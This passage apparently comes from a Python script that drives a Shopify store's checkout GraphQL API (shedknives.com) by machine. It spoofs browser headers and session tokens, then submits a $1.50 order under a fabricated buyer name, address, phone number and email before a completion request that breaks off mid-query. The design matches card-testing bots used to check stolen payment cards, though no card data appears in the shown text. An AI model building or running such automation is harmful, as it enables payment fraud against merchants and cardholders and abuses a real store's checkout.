MoneyValueConstraint{value{amount currencyCode __typename}__typename}}taxes{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}__typename}metafields{key namespace value valueType:type __typename}}fragment ProductVariantSnapshotMerchandiseDetails on ProductVariantSnapshot{variantId options{name value __typename}productTitle title productUrl untranslatedTitle untranslatedSubtitle sellingPlan{name id digest deliveriesPerBillingCycle prepaid subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}deferredAmount{amount currencyCode __typename}digest giftCard image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}price{amount currencyCode __typename}productId productType properties{...MerchandiseProperties __typename}requiresShipping sku taxCode taxable vendor weight{unit value __typename}__typename}fragment PurchaseOrderBundleLineComponent on PurchaseOrderBundleLineComponent{stableId merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}quantity recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}totalAmount{__typename amount currencyCode}__typename}fragment PurchaseOrderDiscountLineFragment on PurchaseOrderDiscountLine{discount{...DiscountDetailsFragment __typename}lineAmount{amount currencyCode __typename}deliveryAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}merchandiseAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}__typename}',
    'variables': {
        'sessionInput': {
            'sessionToken': x_checkout_one_session_token,
        },
        'queueToken': queue_token,
        'discounts': {
            'lines': [],
            'acceptUnexpectedDiscounts': True,
        },
        'delivery': {
            'deliveryLines': [
                {
                    'destination': {
                        'partialStreetAddress': {
                            'address1': '5th Park Ave S New York',
                            'city': 'New York',
                            'countryCode': 'US',
                            'postalCode': '10010',
                            'firstName': 'Camylle',
                            'lastName': 'Bogan',
                            'zoneCode': 'NY',
                            'phone': '12195154586',
                            'oneTimeUse': False,
                        },
                    },
                    'selectedDeliveryStrategy': {
                        'deliveryStrategyByHandle': {
                            'handle': '6a1c1836c48ae06e9b10ba44d9aec215-799098757f2064f8104d4c661f157e79',
                            'customDeliveryRate': False,
                        },
                        'options': {
                            'phone': '12195154586',
                        },
                    },
                    'targetMerchandiseLines': {
                        'lines': [
                            {
                                'stableId': stable_id,
                            },
                        ],
                    },
                    'deliveryMethodTypes': [
                        'SHIPPING',
                    ],
                    'expectedTotalPrice': {
                        'value': {
                            'amount': '0.00',
                            'currencyCode': 'USD',
                        },
                    },
                    'destinationChanged': True,
                },
            ],
            'noDeliveryRequired': [],
            'useProgressiveRates': False,
            'prefetchShippingRatesStrategy': None,
            'supportsSplitShipping': True,
        },
        'deliveryExpectations': {
            'deliveryExpectationLines': [
                {
                    'signedHandle': '9FlXlg9oMM7HgbnLywOdjvvGuCjzlqGFWT0pN+bjGPWkjhHN2X6tH7l8GFddh2yC9pm8N8QuToNEoNljMpzDTZL6BxMa22jBaoEr4UZpy+3iXRKKMcNN3gk/ENLRMpi8shx1M0rvs58Kx3C4+mU642Hj7smQytG4XzKl7Sa0qSKp5FTwHHdvKp9cN/aaR8kX5p94YxH5HYJ6Ya8Q77xuaQ/d0rkownfaCQ5ojS3ihWc5q78XuTf6JqeBsuvCSC1xJDtK8YaHDjQl8YreXU4HSkcNyMAPQQEqPLmIRdf1mNu7z1TuMJKKgsDNrs+Yo/ro4adNoZ5eOgLzO1kxxEWhlusnr17EbU2bGJo4deSTpADu2X6UE1nF4TvdCgGtCQG//I3SyFRqHy+ab51+jHxZJEZ1bgrpusyH5W46trnI8Twv6ODsnB2TRQmv4IRVgeMDxnvrAZbNLAc1uhNSt/st6djLD0sXvOLTWaP4JypfLpd+MY0e7phZfgGh+klFsAYu5E4gwQcO7w7myd5jkaN0NivdkDDa8bNA2T5ooy1AKWOkTEIEWn8VuuN4VXO3D485tRNhIrXlPBxG75pKJwyhVi4jEaamCPgWjU3+aYLw1soxhCtgYAFUlEWXRWxGrVyVZDxwasN1ilDXob4wLLlQWMLblX1X3iNY4Gnv5K9X8k7iu9GpoMZgxatG8IkxUxcd7N/Ep1zZ51v1Uh8stxlwpskg0RBtjXt5Ztygk3cNDubtYB4emWZbccib6+jAo3kmCfc2z1G4PjBCZ0nyn1MthOh3O+2XVs/azWadmUj1RQa/vy1yz8ehUEsawuMtpUmiw6ni8ag9kgSh/0yYKwHUY+xUdv4rmQx2oCauuPfV76PN+jHMlPFuwkpJNo/12yh7pqGltaoUpUbsjg+kZtBtqORVUutzdnJZ3jw6aUx2IdSuxxQc0y62anhST/DZHkkPG/SvRwIUbvqJPX7iusiF/q2MTJss3d1YC15FAhogLs2yYFtQJc6ltxZhU3NgG1GpLF21jZPuKOkfbKDKOheMEPUXVI9K+BRLFBQtcvD/zmfrK+XUsgy8w/s6+feh5LBUjJ1vOYMxxxRm5fULHvvYp2ambZTfut8CfJU/fufqUVdk36UVCCdpQazmLit5DZ8ALy6ja+Euc8qLtIeaWJ/m8bbgidP9+gLA/GM83UFe5djHsgREF1i+JAwiellUun1iNn3a8sUlHmYh5rUJUnQMLm5HMQYVRmWQkLmCaFCwhRwm5/z8zcx4YwcAaUbBbJzI6+zBn7931oHtmIyMBwxAueQyr07x9zygP9BupeVdvuKSfuhb3QuTSOY5x68zM3+vC8Xczgbzs4kawCszOO4GwBTMUCmmidg/xWoh+HyA01Kj2mm78O6D5k157xCXXZecU0c5Ery39n2xrmZx74u5KdFsZORFuAzOg6k6jVLRp7OPklU0Y10=--ePG5P3CcJydVlQWB--0uvfNKpSv9zA0sqASVZKjw==',
                },
                {
                    'signedHandle': 'gWHwBEzqLa96iPObCGUx+uL0C+5f4QxjY2s7GLH6uNBYkiBhrP043vCh/LLucJ2dX6jjpctKsbwLWO0ufnaehG78Dx4mOBDHA3TfIf+1JN7xlYjXtsPaZBjBbn565CdLweqm8p+yJCTwiDheT7R9tWp9D4aPQNzA8o3UQhG3WglfUE7T42gtpkViKhE4WYZn9Kc7ND4l9MND3soFs/yWDJxNyeHv8IAoRzEw50DuhYcEZ33hAXPyKBrI7xFz3s4+qHSzES1qTZUmOWP0+QZ5h0b+9yGYe2j3h71pCtxGpcHbNR+iyJ7eX29SqLlOl1KYVmWQzLH3YLR2mAMuJZJJDcFYhhEGY/TQgMoXTSXmEAK6JGjiAI/l5h1cNY8HflvOYUT7XwqUqPdan4DunFfcd072gf+IsiLwMruO0obml41k6edoeXKd3bLW5NNPAOI91/HiycWxjw6bVXXtuOkx5JbrHtotZOsjp9ziYFMkqHABEhlfp4Vg0W0zoBU4lNUi45YCNmLwvTi47rKgne9bL4rGg6L6BgbkYw2QUG/yftEQE5ZL3jV1m5eOiEwGQEsu6IQ50J9etSjyRsup9rsaYEE10vEK6dtZEYMxf3F52wXMJ+T1Oh1aJpmUjeNIQnFbdg9aUFn9bud3PsZL3+3htev0B20THsIU88BWyxx93mkvQtGdyqLwfMGRtWxfgXpzm0xq9EAlQ3D4UOBjwCyOXInkqPODlsqROoizXc4MoDvbjm2HC55sf/zuYE2t4BvJFRQn/BvDCzViiMevfCCXwi4vXxHOmTGBudBfJx6t2BmGlhlUeH3a0943G27ooOURTh/ZLS0NPMkfdcng/S4rhi7Wit7Sjlh7U1Gg4o3BYknPE2vdX85zgOckk1RHanosmO4dwmgzdhavd6DeSLsTLlu75EjIRW4xSC9qUfoZ3y+6Selu7zsQMPMQXiHz9S+pzODmFNBSCfMDMbqQK0mZ1X5Ne6zul3vAkhSUzmOM7zeJKhQKnpF6e7H3iURzLa3V/nCN68k=--PUk1nPmPcR+9TBoS--IAeDzPkHLgcsbKC9+H3djQ==',
                },
                {
                    'signedHandle': 'eOskN6AvfzKilpdjWn3owl7S45GU7eqKHjqYcRmrZqkO6kQfGun3WeiKbkxugKhdqOGRfiZvhIyKxJ3hCGILeSkZajXjSZzAztywaI2WWLu6V31Bczjs5pVvBh+uIUpflWGOa5yyVUjGZD7/m81lHzaV50wTL5BREcCZsDcMr3O35hmQO8IyEkgX7xdHuxkRuyXVs03MYd2bTDXgxfiEwVAYX+/7NbZGmYkgbne2WnAM7I6aHd4L+dGzj5nT/K7ztLDYiI6BSCGylbCwHQkgyiJVZJlAoc0hA1SlqQVtE8FlzaxtAu+7G0M8GkyMHjmrGCzzTHuXP283ZSmrMEbjGMmn4PWmdpQaEYJ+LbqybSHLOHcvjiOo7/ExgjiB2AX3BOflgMoAzk/jwHeTP3UQaj7F9fqEfFx4r9L0aibng9bY1+TyxoLIp0hro0q2+7g5BwL4ocgFCEMdFObGC/32feK2abCJCG/IT9F/Q+x6JCa+LnEreLPZJISZF2JylWHhvH1xESgvl3uXyku9aZuXP1FpiHFhWvrQBI1a7aM3kLzCtD2xKWuT208st5c08ZMBipbTL9SI72iAlWll8ae5FiZWAvGsymLg2wBtGgp4cYcZDk6ObvXemu6RgUUqZ3e5ywGsrLYB5xRnaOb+bSwhvo+EfyZK1Ucjnr0gc1KbZtZYk1fsUyfmdYd50W5WRrfTV4OPI7o1LWMVaB/sprCHDjuxfEdOP3jFLeOeRrNXGbigMGTt7RRB1fU81CHErUBRQdjFj95CE+X5v3zHlLaQku3wxEZnF15wNl/ofWoXtQl+XJxBq0xYd/xIAoZO2DyavkW0gXUuBhttUEAlqKWVqhQ1aUq5MDFgIJtJnnP/0Fnq4GsBA5LTWRfj0LXGr3A+V6fBY7kUCY9vNsWJM+nQhrdXBE3Ky3TEPOT+hi/pWp2eCZXfA8/mNyQMpWANVvmdFI+fi8i8JdRF1+9ttgjXcDi2i79R0spwVUAzZTsOnnhWv6nOF701nZ+9QWLnQk1nq55uIQeeVhDGGVCnrhNSLSSVnwrsLwvPicwNdyJESiDPqN9nTxR5NNJCBpnxJ9OowgY+262w8+8DdaVNfRE4YTJrh3qxGmNBcfkYIGz2g9mumGKMBktQZeWRZnTZHdwMcI7G/ChsXZhsqebJ0FZwCaYaPW8IsuIkwY/7KNOcDNcfGSK3zVg5pnnJs6CS+JhxBXEYYrZ5ibygFGZ7VhTTqESH5o1CqJnMBlBL+ofil1jX1/zLJOFO6XcgDJGyNL6KLBAUJhQFo8OcPi4ybAORQGa8tmwCRwJ3bmBAyQ6TroI8FRjNa/JmhIAJrUk9hRJRtnA8O0F0/tawesdT+LHgFiBB+IMNfSaFg2jQ4asFWYOMZJoLmSIec2AxcCV00D9P4Cq4OSM9LhGAYg2KOVK7oLu/8r2IFsr3Ws2VgjMT1mPQSADSsuU=--RJv02pK30wdQeHdx--bxMNDNqR2iM9Ko/VzBRXjQ==',
                },
                {
                    'signedHandle': '52ddosaqLEJR3lbLD+oLEWb1RKdfiv7NN4+k2QKYpd2RR+cyfxm+E9h+5EA7X6wD4xzE7CBIuJraUTMiZRsAgw18l+UyLT3L+kuxuTV4mkySRhZW+MK1h62QaQQyHUVEtutvx/jzT05M6oCOEJOH26TJJPeeWiTrt/zfO1/EAsaK4mBP++jPqS83sX7+VTw4BdQ1x2tVaY1VO3daaFYdMAHaRtKGvLx4f+K/JJm2tPdAAYbRAEzEj8Puf+d6LhSv+WfTW924JX+kCRi+5BeQVhvSiOSje3iU9cnoq1mZj3d4W7gp+dLDyFX8XJDXJXNIZ0aRUYb/L30JQfeWz4NRqn5yJpKzXZBePr6csmEIsefZ8iwqrBRmU0Vqwuu/M/12EWeKbnUNPUcAyn8detXRqGdGLEs609WsfwwShRLD7NarpfUBCHs6qvO2GiVetBJYq8sAgt0dJjm+gV510uhnYFbVFIKFjEP/21hsFE6YV8gy/4utgyM9jgmOp+YqQgOLIhAUgmOGAmlUI36fBoMaO/vncmR+8MWDAHms9lE1slHju3SAZY3G0HVmBNzmPOJqqwQS4L6gRlHqEy+T1OOkXl+JtT0/nPOZbiQ97lnoIF/3lTalUfypWQY5R7HJX+O9rKAGKJkPMn6oTfDF5kDtCwFfGfZpoZKJkM7+p5dX3JNiMUexJbV0Px97FarOe2z+KSssGOfpmR9e1AEpeLY3RfbumxO/zdlvR9Jbr6BmDDMeH8U44RYPl396X9o5KXkd7M2XbQB1tCgzsyw4sAjh76fsL13wLZ4jsbh1lnrBAJIpSE7tNrCbeahySL6N0bjZoMXiLc1i1KfNiO8KbluYySNJxFv+F4r4D+KtMCOQuUopmJGw5J6BJr0jRwP/mqHNfuwn5Nq6yV1cByMGkyeC7q1owTeUtRdJRkJuajfneLi1zwxxZ1+pmTUz0OIU5T9abjIgMdpVDb+N3sttIun3PYDmxtk5+HQnWAG+BsqVnHbT+NdAgrzUyZJRvCevhQHBm/GV5NWiC8B+XfmkFmnTNATwsrZmm9mBxQJ4psYPXx1JFsa2R7jQvTdfaMKhmdaPBMHYBTPiwh87FC23xBB56E7O1b3wc+VcYkaJxt2vpPKSF8oRqllbOcJJYGEiVIfCgcsTpmVIjdZ1lX24bpNwk1hPz0Ab6U3pkJe5ueN/ePtYPj1Qnda2uXokOikjvJRyRpS9HuC5inBvrLcBXiEOw9BsdsaDhbMYBJ1nu0u/BVPDnBdf/lHE/po6hFlA1THHGCQsVJU1hTalP409zmcclTWSByxUDvO+Z7J4lrN+Z8nDGL9u1RdCZIMSu6BYhHIUIb60muADcM9dIe/kVQ+7wrzmNWss9PcFBjZnUeiePvyeok2ALuf7H66ZAG5X0pw/UBY+bo70JEgoOOcS08K1+CNftGNJY9iW3Ss1Fmrpmx93IugW0UI=--N7/7ruoAEKEaktri--mGpqXUaiyh1vpzdxmHgCHw==',
                },
                {
                    'signedHandle': 'OOQmPvmD8c5tEpnLMlzhd0YqzWvDoeVcHsacfnRRtXniyzkyZxAJIhsStAILpbDpSIGNmSA8gxvSnLBBJUaLw3H0u8h0lS+4nw8GqX7Iaihg52lPmfVyseY1UByIZDPRbdNkMTT7S/HAVZckOZ4yJnpAe9leAPUrlxIvZhU+hzvTN5tSW1M4JzQHWqS7eOOYhLczpKuD/1IYvTjlxj1As8O+CSqLUenvr+M/ysp/Sjob/ozQDLplgESOp1c7BgHykWWAin83JuF6Q5VVKxT2sbLwCEk6/g6UenCU29RmweMcTA2lHWYV9rUbC09HUbki01MlnLoDW+BPpDVIdhX+q/iE5CKLCmPmm/mtfZNdKTEWtRNg29AamoUSTeiL5nS9M6APnTeO7WVvv0x2TrU2AR3GYHkVxVOmWLiVewufvya6l6EfMV34lLvf13n7rG6+Aw6kr4+PMh4RgcwrvWjeUPL1TWkGJXW+Wtc+ja9VBHHLItvcpLpkWimpfJc9PesTQAvN3ZgXmIOZWQPrEFRdu9gTnKLQt0uAdnsqXN4lIMEdlR8VTZSfebc1DmESeKwj8n43SAKQetGb7jmEacXBIkiCKxce9wxv7mInW4m5Bq1yk+ouMQ1Sjl7owEooUIwzLCbmUmiyTb2Y3XOcESAAJX+d0/9p8LwtFGM/25sQzHWNYm93gvrzCska1hAVEQ5oHHGdU2EFxw15A+MPpKXBOuK/m3TMmYpXVmuSixuOdGmvpFxG5AgS6OyPtjb2JqWQJ/61BvM++BPmMiG9Dgx5P4qpkFwzdVlXIezvXbm4THDdCzp5+FEPYjV5K56t88ZNPm+wvv7yxVOYx6YWtKYW0qAPhp5UiDd9RkO6EWjJSNkCP8QqGf1lxm/LcVXXOT/xb3hATa43CvXFfYXqjPlG59hHIHVLGe+CK8OumVotFT+3T5LP/C9t7XdisU6ME40Wv74BZUYRuf5sP06jfy3Pi3xiamoFcf+jO4zUfTgEfpTeyH9Yl+5CEkIE81YMzsG/5KJeyAE=--NL4HjKwpO2BRGhJ8--RFiU6us10cjpluye4/PdHQ==',
                },
                {
                    'signedHandle': 'Y/oOaKv4gW0PAZRLdNwUGWI7DYcQOl77SFiqBfTn40rRi1TxmShW+AxEYylcQBX3k2eqTaBb3A/oSEGbt7/rn2rov44RZcCBuy3xkOKr0Uaar+Guqep7UM+PgzasTI5CCaxP4det7J/T6JgpOHto51GP/i9tJaJy9gn6oH4uufj6aLHUWIgpFmhWyM4PSIsxWOf2SPFavwl/FaRWsUCFz/uTNEnCiyWRDlgE0g+JyCHNMGErLloTFI40XM26KCndqIWqGH7cP6Jij7ODWPssCpV8AekJc2f3pDn9s0ARqOoe8NuK6uQtViqdn9rFtAtBU4m+eekqMPRy+rDAm3an9hVC88kuJX1E3FIutCsJlL9+XqqoKDDbwaeI46Q0jfZPMRuIL/JeG0yw/++3p43H/fmSKvrj9gvv9LhXsQUDSo2s+RuyuQWJsm5ze6BrPOdrtLfeS/TYx6+/yZVl+wfBJCsRWvYqv2lLnzfPz+NSAA2q0W3hUi68mukouXoIP6isCJ/3doskzZo8vcL1RTE8ia9PMOv6oZhK40tql6pWPob/903RClQ0WgZNUvMb080hNgcmR+bUwkp9QOzL3ntn8EpvfrrNb3Au9KsAf32ia8MZMSHpJS7jp9kwHJr1k//tjqjH4ToJffJhWwvLf8Q0aH+VCgkbv81h/l38mKgeElbVxw89VuY+av4y9ZzwYtzRlCc8LF/iJT7ImIV4Sw3drRT8Qcy3GO3ebkpmb9c9QI772BYlWElq/4SEiBqDUiWrnUI3nZxdvAPenMYNR6BHfBIn+shoZ6dwmIwKkc3rqMPXHpC6Khdl1PqlV0XI9wM/NGIBO4YxiEGDrWv5heauSO7NjCiYU9guQJNUhPuh15rdmEkw16alf0fGPUVrZx2LgIuCvci7A/KZoIrQSdf1/bTDWOCjYidGDjHzocSMgsnMZGBZtAwBpaendAq9Z/b7rhPpkNst+32ojbNVfJRgmqvi56Gr8xMbybZPNE0xOxXadW207dVdIwmJoPew4k0HmMiwHu0=--u5jZiMUpGgOnXy/4--5Vg5ff9I7zg6yckuXu9x/w==',
                },
            ],
        },
        'merchandise': {
            'merchandiseLines': [
                {
                    'stableId': stable_id,
                    'merchandise': {
                        'productVariantReference': {
                            'id': 'gid://shopify/ProductVariantMerchandise/41696773669034',
                            'variantId': 'gid://shopify/ProductVariant/41696773669034',
                            'properties': [],
                            'sellingPlanId': None,
                            'sellingPlanDigest': None,
                        },
                    },
                    'quantity': {
                        'items': {
                            'value': 1,
                        },
                    },
                    'expectedTotalPrice': {
                        'value': {
                            'amount': '1.50',
                            'currencyCode': 'USD',
                        },
                    },
                    'lineComponentsSource': None,
                    'lineComponents': [],
                },
            ],
        },
        'memberships': {
            'memberships': [],
        },
        'payment': {
            'totalAmount': {
                'any': True,
            },
            'paymentLines': [],
            'billingAddress': {
                'streetAddress': {
                    'address1': '5th Park Ave S New York',
                    'city': 'New York',
                    'countryCode': 'US',
                    'postalCode': '10010',
                    'firstName': 'Camylle',
                    'lastName': 'Bogan',
                    'zoneCode': 'NY',
                    'phone': '12195154586',
                },
            },
        },
        'buyerIdentity': {
            'customer': {
                'presentmentCurrency': 'USD',
                'countryCode': 'US',
            },
            'email': 'indirmanu@gmail.com',
            'emailChanged': False,
            'phoneCountryCode': 'US',
            'marketingConsent': [
                {
                    'email': {
                        'value': 'indirmanu@gmail.com',
                    },
                },
            ],
            'shopPayOptInPhone': {
                'number': '12195154586',
                'countryCode': 'US',
            },
            'rememberMe': False,
        },
        'tip': {
            'tipLines': [],
        },
        'taxes': {
            'proposedAllocations': None,
            'proposedTotalAmount': {
                'value': {
                    'amount': '0',
                    'currencyCode': 'USD',
                },
            },
            'proposedTotalIncludedAmount': None,
            'proposedMixedStateTotalAmount': None,
            'proposedExemptions': [],
        },
        'note': {
            'message': None,
            'customAttributes': [],
        },
        'localizationExtension': {
            'fields': [],
        },
        'nonNegotiableTerms': None,
        'scriptFingerprint': {
            'signature': None,
            'signatureUuid': None,
            'lineItemScriptChanges': [],
            'paymentScriptChanges': [],
            'shippingScriptChanges': [],
        },
        'optionalDuties': {
            'buyerRefusesDuties': False,
        },
        'cartMetafields': [],
    },
    'operationName': 'Proposal',
}

              request = await session.post(
                  'https://shedknives.com/checkouts/unstable/graphql',
                  params=params,
                  headers=headers,
                  json=json_data,
              )

              headers = {
    'accept': 'application/json',
    'accept-language': 'en-IN',
    'content-type': 'application/json',
    'origin': 'https://shedknives.com',
    'priority': 'u=1, i',
    'referer': 'https://shedknives.com/',
    'sec-ch-ua': '"Chromium";v="136", "Google Chrome";v="136", "Not.A/Brand";v="99"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'shopify-checkout-client': 'checkout-web/1.0',
    'user-agent': user,
    'x-checkout-one-session-token': x_checkout_one_session_token,
    'x-checkout-web-build-id': '2cc80faca885ade9db1085b81b6b927c893b6162',
    'x-checkout-web-deploy-stage': 'production',
    'x-checkout-web-server-handling': 'fast',
    'x-checkout-web-server-rendering': 'yes',
    'x-checkout-web-source-id': token,
}

              params = {
    'operationName': 'SubmitForCompletion',
}

              json_data = {
    'query': 'mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!,$metafields:[MetafieldInput!],$postPurchaseInquiryResult:PostPurchaseInquiryResultCode,$analytics:AnalyticsInput){submitForCompletion(input:$input attemptToken:$attemptToken metafields:$metafields postPurchaseInquiryResult:$postPurchaseInquiryResult analytics:$analytics){...on SubmitSuccess{receipt{...ReceiptDetails __typename}__typename}...on SubmitAlreadyAccepted{receipt{...ReceiptDetails __typename}__typename}...on SubmitFailed{reason __typename}...on SubmitRejected{buyerProposal{...BuyerProposalDetails __typename}sellerProposal{...ProposalDetails __typename}errors{...on NegotiationError{code localizedMessage nonLocalizedMessage localizedMessageHtml...on RemoveTermViolation{message{code localizedDescription __typename}target __typename}...on AcceptNewTermViolation{message{code localizedDescription __typename}target __typename}...on ConfirmChangeViolation{message{code localizedDescription __typename}from to __typename}...on UnprocessableTermViolation{message{code localizedDescription __typename}target __typename}...on UnresolvableTermViolation{message{code localizedDescription __typename}target __typename}...on ApplyChangeViolation{message{code localizedDescription __typename}target from{...on ApplyChangeValueInt{value __typename}...on ApplyChangeValueRemoval{value __typename}...on ApplyChangeValueString{value __typename}__typename}to{...on ApplyChangeValueInt{value __typename}...on ApplyChangeValueRemoval{value __typename}...on ApplyChangeValueString{value __typename}__typename}__typename}...on InputValidationError{field __typename}...on PendingTermViolation{__typename}__typename}__typename}__typename}...on Throttled{pollAfter pollUrl queueToken buyerProposal{...BuyerProposalDetails __typename}__typename}...on CheckpointDenied{redirectUrl __typename}...on SubmittedForCompletion{receipt{...ReceiptDetails __typename}__typename}__typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token redirectUrl confirmationPage{url shouldRedirect __typename}orderStatusPageUrl shopPay shopPayInstallments analytics{checkoutCompletedEventId emitConversionEvent __typename}poNumber orderIdentity{buyerIdentifier id __typename}customerId isFirstOrder eligibleForMarketingOptIn purchaseOrder{...ReceiptPurchaseOrder __typename}orderCreationStatus{__typename}paymentDetails{paymentCardBrand creditCardLastFourDigits paymentAmount{amount currencyCode __typename}paymentGateway financialPendingReason paymentDescriptor buyerActionInfo{...on MultibancoBuyerActionInfo{entity reference __typename}__typename}__typename}shopAppLinksAndResources{mobileUrl qrCodeUrl canTrackOrderUpdates shopInstallmentsViewSchedules shopInstallmentsMobileUrl installmentsHighlightEligible mobileUrlAttributionPayload shopAppEligible shopAppQrCodeKillswitch shopPayOrder payEscrowMayExist buyerHasShopApp buyerHasShopPay orderUpdateOptions __typename}postPurchasePageUrl postPurchasePageRequested postPurchaseVaultedPaymentMethodStatus paymentFlexibilityPaymentTermsTemplate{__typename dueDate dueInDays id translatedName type}__typename}...on ProcessingReceipt{id purchaseOrder{...ReceiptPurchaseOrder __typename}pollDelay __typename}...on WaitingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}...on CompletePaymentChallengeV2{challengeType challengeData __typename}__typename}timeout{millisecondsRemaining __typename}__typename}...on FailedReceipt{id processingError{...on InventoryClaimFailure{__typename}...on InventoryReservationFailure{__typename}...on OrderCreationFailure{paymentsHaveBeenReverted __typename}...on OrderCreationSchedulingFailure{__typename}...on PaymentFailed{code messageUntranslated hasOffsitePaymentMethod __typename}...on DiscountUsageLimitExceededFailure{__typename}...on CustomerPersistenceFailure{__typename}__typename}__typename}__typename}fragment ReceiptPurchaseOrder on PurchaseOrder{__typename sessionToken totalAmountToPay{amount currencyCode __typename}checkoutCompletionTarget delivery{...on PurchaseOrderDeliveryTerms{splitShippingToggle deliveryLines{__typename availableOn deliveryStrategy{handle title description methodType brandedPromise{handle logoUrl lightThemeLogoUrl darkThemeLogoUrl lightThemeCompactLogoUrl darkThemeCompactLogoUrl name __typename}pickupLocation{...on PickupInStoreLocation{name address{address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}instructions __typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}carrierCode carrierName name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}deliveryPromisePresentmentTitle{short long __typename}deliveryStrategyBreakdown{__typename amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice flatRateGroupId targetMerchandise{...on PurchaseOrderMerchandiseLine{stableId quantity{...on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}legacyFee __typename}...on PurchaseOrderBundleLineComponent{stableId quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}__typename}}__typename}lineAmount{amount currencyCode __typename}lineAmountAfterDiscounts{amount currencyCode __typename}destinationAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}__typename}groupType targetMerchandise{...on PurchaseOrderMerchandiseLine{stableId quantity{...on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}legacyFee __typename}...on PurchaseOrderBundleLineComponent{stableId quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}__typename}}__typename}__typename}deliveryExpectations{__typename brandedPromise{name logoUrl handle lightThemeLogoUrl darkThemeLogoUrl __typename}deliveryStrategyHandle deliveryExpectationPresentmentTitle{short long __typename}returnability{returnable __typename}}payment{...on PurchaseOrderPaymentTerms{billingAddress{__typename...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}}paymentLines{amount{amount currencyCode __typename}postPaymentMessage dueAt due{...on PaymentLineDueEvent{event __typename}...on PaymentLineDueTime{time __typename}__typename}paymentMethod{...on DirectPaymentMethod{sessionId paymentMethodIdentifier vaultingAgreement creditCard{brand lastDigits __typename}billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on CustomerCreditCardPaymentMethod{id brand displayLastDigits token deletable defaultPaymentMethod requiresCvvConfirmation firstDigits billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}...on PurchaseOrderGiftCardPaymentMethod{balance{amount currencyCode __typename}code __typename}...on WalletPaymentMethod{name walletContent{...on ShopPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}sessionToken paymentMethodIdentifier paymentMethod paymentAttributes __typename}...on PaypalWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}email payerId token expiresAt __typename}...on ApplePayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}data signature version __typename}...on GooglePayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}signature signedMessage protocolVersion __typename}...on FacebookPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}containerData containerId mode __typename}...on ShopifyInstallmentsWalletContent{autoPayEnabled billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}disclosureDetails{evidence id type __typename}installmentsToken sessionToken creditCard{brand lastDigits __typename}__typename}__typename}__typename}...on WalletsPlatformPaymentMethod{name walletParams __typename}...on LocalPaymentMethod{paymentMethodIdentifier name displayName billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}additionalParameters{...on IdealPaymentMethodParameters{bank __typename}__typename}__typename}...on PaymentOnDeliveryMethod{additionalDetails paymentInstructions paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on 